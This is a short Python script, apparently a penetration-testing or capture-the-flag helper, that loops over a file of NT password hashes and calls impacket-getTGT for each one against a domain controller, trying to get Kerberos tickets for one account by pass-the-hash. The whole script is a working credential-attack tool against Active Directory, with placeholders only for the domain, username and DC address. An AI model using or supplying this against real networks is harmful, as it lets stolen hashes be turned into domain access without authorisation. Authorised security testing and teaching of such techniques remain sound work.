#!/usr/bin/env python3
import os
import time

with open("hash-list.txt", "r") as spicyhashyboi:
    lines = spicyhashyboi.read().splitlines()
    for i in lines:
        hashywashy = i
        print("<USERNAME> :", hashywashy)
        command = 'impacket-getTGT <DOMAIN>/<USERNAME> -hashes aad3b435b51404eeaad3b435b51404ee:{} -dc-ip <FQDN>'.format(hashywashy)
        os.system(command)
        time.sleep(2)
